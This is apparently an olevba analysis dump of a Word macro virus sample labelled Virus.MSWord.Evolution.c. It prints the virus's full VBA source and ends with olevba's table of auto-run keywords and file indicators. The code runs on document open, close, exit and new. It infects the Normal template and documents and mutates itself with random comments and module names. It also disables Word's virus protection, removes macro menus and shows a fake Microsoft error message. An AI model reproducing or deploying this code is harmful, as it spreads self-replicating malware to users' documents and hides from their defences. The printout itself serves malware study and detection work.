olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Evolution.c-fbf0343a51c2fb8af1170ea36194ac5851d8cd77
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Evolution.c-fbf0343a51c2fb8af1170ea36194ac5851d8cd77 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO JXU.bas 
in file: Virus.MSWord.Evolution.c-fbf0343a51c2fb8af1170ea36194ac5851d8cd77 - OLE stream: 'Macros/VBA/JXU'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 '
 'Kaspersky Labs.
 'T
Public Source As String
 '
 'MP
 'T
Public ByeMacro As String
 'T
 'Kaspersky Labs.
Public Hostinf As Boolean
 'MP
 '
Public FileInf As Boolean
 '
 'MP
Public FExport As String
Public PMExport As String
 'T
Public PMFile_Yes As Boolean
Public Ex_Yes As Boolean
 'Tester
 'Kaspersky Labs.
 'T
Public Filename As String
 'Tester
Public FileID As String
 'T
Public FileID2 As String
 '
 'MP
Public Virname As String
 '
Public FC_There As Boolean
 'Mike Pavluschick
Public FO_There As Boolean
 'MP
Public FP_There As Boolean
 '
 'Mike Pavluschick
Public FN_There As Boolean
 'Tester
 'MP
 '
Public FS_There As Boolean
 'Kaspersky Labs.
Public FSA_There As Boolean
 '
Public VrusName As String
 'Tester
 'Mike Pavluschick
 'T
Public Armor As Boolean
 'T
 'Mike Pavluschick
 'T
Function Self_Recognition()
 '
 'MP
 'Tester
On Error Resume Next
 'Kaspersky Labs.
 'Tester
Application.EnableCancelKey = wdCancelDisabled
 'Kaspersky Labs.
Open "C:\windows\system\vnames.cpl" For Input As #1
 'Mike Pavluschick
 'T
Do
 'T
 'MP
 'T
Line Input #1, Virname
 'T
For Z = 1 To ActiveDocument.VBProject.VBComponents.Count
 'Mike Pavluschick
 'Tester
               If ActiveDocument.VBProject.VBComponents(Z).Name <> "ThisDocument" Then
 'Kaspersky Labs.
 '
    If Virname = ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo lost
 'T
 'MP
 'T
    If Virname <> ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo newname
 'Mike Pavluschick
 'Tester
newname:
 'T
Close #1
 '
Open "C:\windows\system\vnames.cpl" For Append As #1
    Print #1, ActiveDocument.VBProject.VBComponents(Z).Name
 'Tester
      Close #1
 '
        End If
 'Tester
    If ActiveDocument.VBProject.VBComponents(Z).Name = "ThisDocument" Then GoTo lost
 'T
 'Kaspersky Labs.
lost:
 'T
Next Z
 'T
 'MP
Loop Until EOF(1)
 '
 'Kaspersky Labs.
Close #1
 '
 'Kaspersky Labs.
Dim Lib
 'Tester
Open "C:\windows\system\vnames.cpl" For Input As #1
Do
Line Input #1, Virname
For Lib = 1 To NormalTemplate.VBProject.VBComponents.Count
 'Tester
 'MP
 'Tester
    If NormalTemplate.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo skip
 '
 'Kaspersky Labs.
    If NormalTemplate.VBProject.VBComponents(Lib).Name = Virname Then Hostinf = True: GoTo doccheck
 'T
 'Kaspersky Labs.
 'T
skip:
 'Tester
 'Mike Pavluschick
 'T
Next Lib
Loop Until EOF(1)
doccheck:
 'T
 'Mike Pavluschick
 'Tester
Close #1
 'T
Open "C:\windows\system\vnames.cpl" For Input As #1
Do
 'Mike Pavluschick
 'T
Line Input #1, Virname
 'T
 'MP
For Lib = 1 To ActiveDocument.VBProject.VBComponents.Count
 'T
    If ActiveDocument.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo nope
 'T
    If ActiveDocument.VBProject.VBComponents(Lib).Name = Virname Then FileInf = True: GoTo leave
 '
    If ActiveDocument.VBProject.VBComponents(Lib).Name <> Virname Then FileInf = False:
 'T
 'Kaspersky Labs.
nope:
 '
Next Lib
 '
 'Kaspersky Labs.
 '
Loop Until EOF(1)
 'MP
 'Tester
FileInf = False
 'T
leave:
 'T
 'Kaspersky Labs.
Close #1
 'T
End Function
 'Tester
Function Armor_Status()
 '
Application.EnableCancelKey = wdCancelDisabled
 '
 'MP
If GetAttr(NormalTemplate.FullName) = vbReadOnly Then Armor = True
 '
Offense:
If Armor = True Then SetAttr (NormalTemplate.FullName), vbNormal
 'T
Armor = False
 'Tester
 'Mike Pavluschick
End Function
 '
 'Mike Pavluschick
 '
Function Export_Code()
 'Kaspersky Labs.
 '
On Error Resume Next
 '
Application.EnableCancelKey = wdCancelDisabled
 'Kaspersky Labs.
FExport = Dir("C:\windows\system\export.sys")
 'T
 'MP
If FExport = "Export.sys" Then Ex_Yes = True
 'Tester
 'MP
 'Tester
If Ex_Yes = False Then GoTo Morph Else GoTo Recognize
 'Kaspersky Labs.
Morph:
 'Tester
Randomize Timer
 'Mike Pavluschick
q = Int(Rnd(1) * 5) + 1
 '
 'Kaspersky Labs.
 'Tester
For vi = 1 To q
 'T
 'MP
x = Int(Rnd(1) * 26)
 '
 'Kaspersky Labs.
If x = 1 Then a$ = "A"
If x = 2 Then a$ = "B"
 'T
If x = 3 Then a$ = "C"
 'MP
 '
If x = 4 Then a$ = "D"
 'Tester
 'MP
 'T
If x = 5 Then a$ = "E"
 '
If x = 6 Then a$ = "F"
 'T
 'MP
 '
If x = 7 Then a$ = "G"
 'Kaspersky Labs.
 'T
If x = 8 Then a$ = "H"
 'T
If x = 9 Then a$ = "I"
 'T
 'Kaspersky Labs.
 '
If x = 10 Then a$ = "J"
 'Tester
 'Mike Pavluschick
If x = 11 Then a$ = "K"
 '
 'MP
 '
If x = 12 Then a$ = "L"
 'Tester
 'MP
 'T
If x = 13 Then a$ = "M"
 'Mike Pavluschick
If x = 14 Then a$ = "N"
 '
 'MP
 'Tester
If x = 15 Then a$ = "O"
 'Tester
If x = 16 Then a$ = "P"
 'Tester
If x = 17 Then a$ = "Q"
 'Tester
 'Mike Pavluschick
 'Tester
If x = 18 Then a$ = "R"
 'Mike Pavluschick
 'Tester
If x = 19 Then a$ = "S"
 'Tester
 'MP
 '
If x = 20 Then a$ = "T"
 'MP
If x = 21 Then a$ = "U"
 'T
If x = 22 Then a$ = "V"
 'Tester
If x = 23 Then a$ = "W"
 'Tester
If x = 24 Then a$ = "X"
 'Kaspersky Labs.
 '
If x = 25 Then a$ = "Y"
 'Tester
 'Mike Pavluschick
If x = 26 Then a$ = "Z"
 '
 'MP
Filename = Filename + a$
 '
 'Mike Pavluschick
Next vi
x = Int(Rnd(1) * 999) + 1
 '
 'Kaspersky Labs.
FileID = "C:\windows\system\" & Filename & x & ".cpl"
 'Kaspersky Labs.
' RAPE v1.1 Export File ID Morph
Open "C:\windows\system\Export.sys" For Append As #1
 'T
 'Kaspersky Labs.
 'T
Print #1, FileID
Close #1
 'Tester
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
 'T
    If ActiveDocument.VBProject.VBComponents(x).Name = "ThisDocument" Then GoTo nex
 'Kaspersky Labs.
 'T
    If ActiveDocument.VBProject.VBComponents(x).Name <> "ThisDocument" Then GoTo rite
rite:
 'T
 'MP
Open "C:\windows\system\vnames.cpl" For Append As #1
 'MP
Print #1, ActiveDocument.VBProject.VBComponents(x).Name
Close #1
 '
nex:
 'Mike Pavluschick
Next x
 'T
CheckMe = Dir("C:\windows\system\PMF1199.cpl")
 'Mike Pavluschick
 'Tester
If CheckMe = "PMF1199.cpl" Then GoTo nextt
 'T
Do
 'Tester
 'Mike Pavluschick
 'T
On Error Resume Next
 'Kaspersky Labs.
Open "C:\windows\system\vnames.cpl" For Input As #1
 'Tester
Line Input #1, Virname
 'Tester
 'Kaspersky Labs.
 'T
NormalTemplate.VBProject.VBComponents(Virname).export FileID
ActiveDocument.VBProject.VBComponents(Virname).export FileID
 '
 'Kaspersky Labs.
 'Tester
Loop Until EOF(1)
 'T
nextt:
Exit Function
 '
 'Mike Pavluschick
Recognize:
 'Tester
Open "C:\windows\system\Export.sys" For Input As #1
Line Input #1, FileID
 '
 'Mike Pavluschick
 'T
Close #1
 'T
CheckMe = Dir("C:\windows\system\PMF1199.cpl")
 'T
 'MP
 '
If CheckMe = "PMF1199.cpl" Then GoTo tryharder
 'Tester
 'Kaspersky Labs.
 'Tester
Do
 'Tester
On Error Resume Next
Open "C:\windows\system\vnames.cpl" For Input As #1
 'T
 'Mike Pavluschick
Line Input #1, Virname
 'T
 'Mike Pavluschick
 'T
NormalTemplate.VBProject.VBComponents(Virname).export FileID
 '
ActiveDocument.VBProject.VBComponents(Virname).export FileID
 'T
 'Kaspersky Labs.
Loop Until EOF(1)
 'T
 'Mike Pavluschick
tryharder:
 '
 'Mike Pavluschick
 '
End Function
 'T
Function Polymorphic_Check()
On Error Resume Next
 '
 'MP
 'T
Application.EnableCancelKey = wdCancelDisabled
 '
 'Kaspersky Labs.
Open FileID2 For Input As #1
 '
 'MP
 '
Dim FC_Check
 'Tester
Do
    Line Input #1, FC_Check
 '
    If FC_Check = "Sub FileClose()" Then FC_There = True: GoTo FO_Look
Loop Until EOF(1)
 'Tester
FO_Look:
 'Kaspersky Labs.
 'T
Dim FO_Check
Do
 'T
    Line Input #1, FO_Check
 '
 'Mike Pavluschick
    If FO_Check = "Sub FileOpen()" Then FO_There = True: GoTo FP_Look
Loop Until EOF(1)
FP_Look:
 '
Dim FP_Check
Do
    Line Input #1, FP_Check
 'T
    If FP_Check = "Sub FilePrint()" Then FP_There = True: GoTo FN_Look
 'Mike Pavluschick
 'Tester
Loop Until EOF(1)
 'T
FN_Look:
 'T
 'MP
 '
Dim FN_Check
 '
 'MP
Do
 'Tester
    Line Input #1, FN_Check
 'T
    If FN_Check = "Sub FileNew()" Then FN_There = True: GoTo FS_Look
 'T
 'Mike Pavluschick
 '
Loop Until EOF(1)
 '
FS_Look:
 'Tester
Dim FS_Check
 'T
Do
 'Mike Pavluschick
 'Tester
    Line Input #1, FS_Check
 '
    If FS_Check = "Sub FileSave()" Then FS_There = True: GoTo FSA_Look
 'T
Loop Until EOF(1)
 'Tester
 'Kaspersky Labs.
FSA_Look:
 'Kaspersky Labs.
Dim FSA_Check
 'Mike Pavluschick
 'Tester
Do
 'MP
 '
    Line Input #1, FSA_Check
 'Kaspersky Labs.
 'Tester
    If FSA_Check = "Sub FileSaveAs()" Then FSA_There = True: Exit Function
 'T
 'Mike Pavluschick
 'T
Loop Until EOF(1)
 '
 'Kaspersky Labs.
End Function
 'Mike Pavluschick
 '
Function Evolve()
 'Tester
 'Kaspersky Labs.
 'T
On Error Resume Next
 'Tester
Application.EnableCancelKey = wdCancelDisabled
 'Mike Pavluschick
 '
'RAPE v1.1 Macro Virus Command/Code Editor - adds 1 to 6 Commands (subs)
 '
Open "C:\windows\system\Export.sys" For Input As #1
Line Input #1, FileID2
 '
Close #1
 '
PM = Int(Rnd(1) * 150) + 1
If PM = 22 Then
 'Tester
 'MP
 '
If FC_There = True Then Exit Function
 'Mike Pavluschick
 '
Open FileID2 For Append As #1
 'T
 'MP
Print #1, "Sub FileClose()"
 'Tester
 'MP
 'Tester
Print #1, "On error resume next"
 'MP
 'T
Print #1, "Call Evolution"
 'Kaspersky Labs.
 'T
Print #1, "Wordbasic.FileSave"
 '
Print #1, "End Sub"
Close #1
 '
 'MP
End If
 'Tester
 'MP
 'T
If PM = 73 Then
 'T
 'Kaspersky Labs.
If FO_There = True Then Exit Function
 'Tester
Open FileID2 For Append As #1
 'Kaspersky Labs.
 '
Print #1, "Sub FileOpen()"
 '
 'Mike Pavluschick
Print #1, "on error resume next"
 'Kaspersky Labs.
 'T
Print #1, "Dialogs(wdDialogFileOpen)"
 'Mike Pavluschick
 '
Print #1, "Call Evolution"
 'MP
 'Tester
Print #1, "end sub"
 'Kaspersky Labs.
 '
Close #1
 '
End If
 'T
 'Kaspersky Labs.
If PM = 69 Then
 'Mike Pavluschick
If FP_There = True Then Exit Function
 'Mike Pavluschick
 'T
Open FileID2 For Append As #1
 '
 'Mike Pavluschick
 '
Print #1, "Sub FilePrint()"
 '
 'Mike Pavluschick
 '
Print #1, "on error resume next"
 'Mike Pavluschick
 'Tester
Print #1, "Dialogs(wdDialogFilePrint)"
 'T
Print #1, "Call Evolution"
 'T
Print #1, "End sub"
 '
Close #1
 '
 'Kaspersky Labs.
End If
If PM = 122 Then
If FN_There = True Then Exit Function
Open FileID2 For Append As #1
 'T
 'Mike Pavluschick
 '
Print #1, "Sub FileNew()"
 '
 'Mike Pavluschick
 'Tester
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFileNew)"
 'Kaspersky Labs.
 'T
Print #1, "Call Evolution"
Print #1, "End Sub"
 'Kaspersky Labs.
 'Tester
Close #1
 'Tester
 'MP
End If
 'Mike Pavluschick
 '
If PM = 90 Then
 '
If FS_There = True Then Exit Function
 'MP
 'Tester
Open FileID2 For Append As #1
 'T
 'Mike Pavluschick
Print #1, "Sub FileSave()"
 'T
Print #1, "on error resume next"
 'MP
 'T
Print #1, "call Evolution"
 'Kaspersky Labs.
 'T
Print #1, "wordbasic.filesave"
 'Mike Pavluschick
Print #1, "end sub"
 'Mike Pavluschick
 'T
Close #1
 'Tester
End If
 '
If PM = 8 Then
 'Tester
 'Mike Pavluschick
 'T
If FSA_There = True Then Exit Function
 '
 'Kaspersky Labs.
 '
Open FileID2 For Append As #1
Print #1, "Sub FileSaveAs()"
 'Mike Pavluschick
 'T
Print #1, "on error resume next"
 '
Print #1, "Dialogs(wdDialogFileSaveAs)"
 '
 'Mike Pavluschick
Print #1, "Call Evolution"
 'Tester
Print #1, "wordbasic.filesave"
Print #1, "end sub"
 '
 'MP
 '
Close #1
 'T
 'Mike Pavluschick
 'T
End If
 'Mike Pavluschick
End Function
Function Norminf()
 'T
 'MP
 'Tester
On Error Resume Next
 'Tester
 'MP
 'Tester
Application.EnableCancelKey = wdCancelDisabled
 'T
Open "C:\windows\system\Export.sys" For Input As #1
 'Mike Pavluschick
 'Tester
Line Input #1, FileID2
 'T
 'Kaspersky Labs.
 '
Close #1
 'Tester
For l = 1 To ActiveDocument.VBProject.VBComponents.Count
 'Tester
    If ActiveDocument.VBProject.VBComponents(l).Name = "ThisDocument" Then GoTo nexus
 'T
    If ActiveDocument.VBProject.VBComponents(l).Name <> "ThisDocument" Then
        Open "C:\windows\system\vnames.cpl" For Append As #1
 'Mike Pavluschick
        Print #1, ActiveDocument.VBProject.VBComponents(l).Name
 'T
        Close #1
        End If
 'T
nexus:
 'T
 'Mike Pavluschick
 'Tester
    Next l
With NormalTemplate.VBProject.VBComponents.Import(FileID2)
 'Tester
 'Kaspersky Labs.
End With
MsgBox "An error has occurred, please save all Documents and restart Microsoft Word.  If the problem persists, please contact Microsoft Technical Support.", 48
 'Tester
 'Mike Pavluschick
 'T
End Function
 'Kaspersky Labs.
Function FileInft()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
 'T
 'Kaspersky Labs.
 'T
Open "C:\windows\system\Export.sys" For Input As #1
 'Mike Pavluschick
 'Tester
Line Input #1, FileID2
 '
Close #1
 'Tester
With ActiveDocument.VBProject.VBComponents.Import(FileID2)
End With
Randomize Timer
 'Tester
WD = Int(Rnd(1) * 8) + 2
 'Kaspersky Labs.
For evo = 2 To WD
x = Int(Rnd(1) * 26)
 'Tester
 'MP
 'Tester
If x = 1 Then a$ = "A"
 '
 'Kaspersky Labs.
 'T
If x = 2 Then a$ = "B"
 '
 'Kaspersky Labs.
 '
If x = 3 Then a$ = "C"
 '
If x = 4 Then a$ = "D"
If x = 5 Then a$ = "E"
 'Tester
If x = 6 Then a$ = "F"
 'Tester
If x = 7 Then a$ = "G"
 'Mike Pavluschick
If x = 8 Then a$ = "H"
 'Tester
 'Kaspersky Labs.
 '
If x = 9 Then a$ = "I"
 'T
 'MP
If x = 10 Then a$ = "J"
 'Tester
 'Mike Pavluschick
If x = 11 Then a$ = "K"
If x = 12 Then a$ = "L"
 'T
If x = 13 Then a$ = "M"
 'T
 'Mike Pavluschick
 'Tester
If x = 14 Then a$ = "N"
If x = 15 Then a$ = "O"
If x = 16 Then a$ = "P"
 'Mike Pavluschick
If x = 17 Then a$ = "Q"
 'MP
 '
If x = 18 Then a$ = "R"
 'T
If x = 19 Then a$ = "S"
 '
If x = 20 Then a$ = "T"
 'Tester
If x = 21 Then a$ = "U"
 '
 'MP
 'T
If x = 22 Then a$ = "V"
 '
If x = 23 Then a$ = "W"
 'MP
If x = 24 Then a$ = "X"
 '
 'MP
 'Tester
If x = 25 Then a$ = "Y"
 '
If x = 26 Then a$ = "Z"
 'Tester
 'Kaspersky Labs.
VrusName = VrusName + a$
Next evo
 '
 'Kaspersky Labs.
Open "C:\windows\system\vnames.cpl" For Input As #1
Do
 'Mike Pavluschick
Line Input #1, Virname
 'Tester
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=Virname, newname:=VrusName, Object:=wdOrganizerObjectProjectItems
 'T
' RAPE v1.1 Macro Virus Name Randomizer - 2 to 8 letters
 'T
Loop Until EOF(1)
 'Mike Pavluschick
Close #1
 'T
 'Mike Pavluschick
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
 'Kaspersky Labs.
 'Tester
    If ActiveDocument.VBProject.VBComponents(x).Name = "ThisDocument" Then GoTo nex
    If ActiveDocument.VBProject.VBComponents(x).Name <> "ThisDocument" Then GoTo rite
 'Tester
 'MP
rite:
 'MP
 '
Open "C:\windows\system\vnames.cpl" For Append As #1
 'T
 'Mike Pavluschick
 'Tester
Print #1, ActiveDocument.VBProject.VBComponents(x).Name
 'Tester
 'MP
 '
Close #1
 'T
nex:
Next x
 'T
 'MP
End Function
 'Mike Pavluschick
Function Evolution()
 'MP
 'Tester
On Error Resume Next
 'T
Application.EnableCancelKey = wdCancelDisabled
Call Self_Recognition
 'MP
Call Armor_Status
 'Tester
 'MP
 'Tester
Call Export_Code
 '
Call Polymorphic_Check
 'MP
 'T
Call Evolve
 'Kaspersky Labs.
If Hostinf = False Then Call Norminf
 'Kaspersky Labs.
If FileInf = False Then Call FileInft
 'T
 'MP
Options.VirusProtection = False
Options.ConfirmConversions = False
 'Mike Pavluschick
Options.SaveNormalPrompt = False
 '
 'Mike Pavluschick
 'T
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
 '
 'Mike Pavluschick
 'Tester
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 'T
 'MP
 'T
' W97M/Evolution
' W97M/Evolution .a Variant by Nex and Error
' Polymorphic Stealth Word97 Macro Virus
' All Things Must Change...
 'Kaspersky Labs.
 'Tester
' Polymorphic thanx to Random Arithmetic Polymorphic Engine (RAPE v1.1) by Error
 'T
' RAPE v1.1 does:
 'T
' Randomly Morphs Source Code by Adding Random Remarks
 'Mike Pavluschick
 '
' Randomly Selects Source Code Export File - Then Morphs it
 'Mike Pavluschick
 'Tester
' Randomly Creates Virus Macro Name
 '
 'Mike Pavluschick
' Randomly Adds 1 to 6 Commands to Code
 'Mike Pavluschick
 'Tester
End Function
 '
 'Kaspersky Labs.
Sub AutoClose()
 '
On Error Resume Next
 'T
Application.EnableCancelKey = wdCancelDisabled
 'MP
 'T
Call Evolution
 'T
 'Mike Pavluschick
WordBasic.filesave
 'T
 'Mike Pavluschick
End Sub
 '
 'Kaspersky Labs.
 '
Sub AutoExec()
 '
On Error Resume Next
 'Tester
 'Mike Pavluschick
 'T
Application.EnableCancelKey = wdCancelDisabled
 'Tester
 'MP
 '
Call Armor_Status
 '
 'MP
Options.VirusProtection = False
 'T
Options.ConfirmConversions = False
 'MP
 '
Options.SaveNormalPrompt = False
 '
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 'Tester
 'MP
 'T
End Sub
 'MP
 '
Sub AutoExit()
On Error Resume Next
 'Tester
 'Mike Pavluschick
 'Tester
Application.EnableCancelKey = wdCancelDisabled
 'Kaspersky Labs.
Call Evolution
 'T
 'Mike Pavluschick
PMExport = Dir("C:\Windows\System\PMF1199.cpl")
If PMExport = "PMF1199.cpl" Then PMFile_Yes = True
If PMFile_Yes = True Then Exit Sub
 'Kaspersky Labs.
 'T
Open "C:\Windows\System\PMF1199.cpl" For Append As #1
 '
Print #1, "W97M/Evolution .a by Nex"
 '
 'Mike Pavluschick
 '
Print #1, "Random Arithmetic Polymorphic Engine (RAPE v1.1) by Error"
 '
 'Mike Pavluschick
 'Tester
Close #1
 'Tester
 'Kaspersky Labs.
 'T
Open "C:\windows\system\Export.sys" For Input As #2
 'Mike Pavluschick
 'Tester
Line Input #2, FileID
 'Tester
 'Kaspersky Labs.
 'Tester
Close #2
 'T
 'MP
 'T
Open FileID For Append As #9
 'Tester
 'Kaspersky Labs.
 '
Print #9, "' EOF"
 'Kaspersky Labs.
Close #9
 '
 'Kaspersky Labs.
 'Tester
Open FileID For Input As #3
 'Tester
Randomize Timer
 '
 'Mike Pavluschick
 'Tester
W = Int(Rnd(1) * 5) + 1
 'Tester
 'MP
 '
For vir = 1 To W
 'T
 'Kaspersky Labs.
 'Tester
x = Int(Rnd(1) * 26)
 'T
 'Kaspersky Labs.
If x = 1 Then a$ = "A"
If x = 2 Then a$ = "B"
 'T
 'Mike Pavluschick
 '
If x = 3 Then a$ = "C"
 'Mike Pavluschick
 'T
If x = 4 Then a$ = "D"
 'Kaspersky Labs.
 'T
If x = 5 Then a$ = "E"
If x = 6 Then a$ = "F"
 'Tester
 'MP
 '
If x = 7 Then a$ = "G"
 'Tester
 'MP
 'T
If x = 8 Then a$ = "H"
 'Tester
If x = 9 Then a$ = "I"
 '
If x = 10 Then a$ = "J"
 'Tester
If x = 11 Then a$ = "K"
 'MP
 'T
If x = 12 Then a$ = "L"
 '
 'MP
If x = 13 Then a$ = "M"
 '
 'MP
 'T
If x = 14 Then a$ = "N"
 '
 'Mike Pavluschick
If x = 15 Then a$ = "O"
 'MP
 'Tester
If x = 16 Then a$ = "P"
 'T
If x = 17 Then a$ = "Q"
 'Mike Pavluschick
 '
If x = 18 Then a$ = "R"
 'Tester
 'MP
 'Tester
If x = 19 Then a$ = "S"
 'Kaspersky Labs.
If x = 20 Then a$ = "T"
 'T
 'Mike Pavluschick
 '
If x = 21 Then a$ = "U"
 'T
 'Mike Pavluschick
If x = 22 Then a$ = "V"
 'MP
If x = 23 Then a$ = "W"
 'Mike Pavluschick
If x = 24 Then a$ = "X"
 '
 'MP
If x = 25 Then a$ = "Y"
 'Mike Pavluschick
 'Tester
If x = 26 Then a$ = "Z"
 'Kaspersky Labs.
Filename = Filename + a$
 'Mike Pavluschick
Next vir
F = Int(Rnd(1) * 999) + 1
FileID2 = "C:\windows\system\" & Filename & F & ".cpl"
 'Tester
 'MP
Open FileID2 For Append As #4
 'T
 'Mike Pavluschick
 'T
Do
 'Kaspersky Labs.
inpux:
 'Tester
 'MP
Line Input #3, stuff
 'Mike Pavluschick
 'Tester
Print #4, stuff
 'T
 'Kaspersky Labs.
 'Tester
    Randomize Timer
 'Tester
    t = Int(Rnd(1) * 5) + 1
 'MP
    If t = 1 Then Z$ = " '" & Application.UserName
 'T
 'MP
 '
    If t = 2 Then Z$ = " '" & Application.UserInitials
 'Mike Pavluschick
 'T
    If t = 3 Then Z$ = " '" & Application.UserAddress
 'Mike Pavluschick
 'T
    If t >= 4 Then GoTo inpux
 'Kaspersky Labs.
 'Tester
    Print #4, Z$
 'T
' Source Code Morpher - adds random remarks to Code (RAPE v1.1 by Error)
 'Tester
Loop Until stuff = "' EOF"
 'Kaspersky Labs.
Close #3
 'T
Close #4
 'Tester
 'Kaspersky Labs.
 '
Kill "C:\windows\system\export.sys"
 'T
Open "C:\windows\system\Export.sys" For Append As #5
 '
 'MP
Print #5, FileID2
 '
 'Kaspersky Labs.
Close #5
 'Tester
 'MP
 'Tester
End Sub
 '
 'MP
 '
Sub AutoNew()
 'Mike Pavluschick
 'Tester
On Error Resume Next
 'Kaspersky Labs.
 'T
Application.EnableCancelKey = wdCancelDisabled
 'MP
 'T
Call Evolution
 '
End Sub
 'T
 'Kaspersky Labs.
 '
Sub AutoOpen()
 'T
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Evolution
End Sub
 'MP
Sub FileTemplates()
 '
 'MP
 'T
Application.EnableCancelKey = wdCancelDisabled
 '
End Sub
 'Tester
Sub ToolsCustomize()
Application.EnableCancelKey = wdCancelDisabled
 'T
 'MP
End Sub
 'Mike Pavluschick
Sub ToolsMacro()
 'Kaspersky Labs.
 'Tester
Application.EnableCancelKey = wdCancelDisabled
End Sub
 'T
 'Kaspersky Labs.
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
 'Mike Pavluschick
 'Tester
End Sub
 'Mike Pavluschick
' "The most polymorphic Macro Virus to date...." - NAI
' EOF
 'Tester
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |vnames.cpl          |Executable file name                         |
|IOC       |PMF1199.cpl         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

